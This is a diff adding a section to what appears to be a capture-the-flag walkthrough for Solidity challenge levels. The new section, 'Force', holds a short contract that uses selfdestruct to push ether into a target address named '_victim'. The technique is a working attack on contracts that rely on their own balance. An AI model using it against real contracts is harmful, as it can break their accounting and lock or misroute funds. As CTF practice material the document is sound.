@@ -146,6 +146,22 @@ Submit the instance
 Submit instance 
 ``` ✌(◕‿-)✌ Well done, You have completed this level!!! ```
 
+## 7. Force 
+
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+contract Force {
+    
+    function destruct(address payable _victim) public payable {
+        selfdestruct(_victim);
+    }
+
+    receive() external payable {}
+}
+```
+
 
 
 
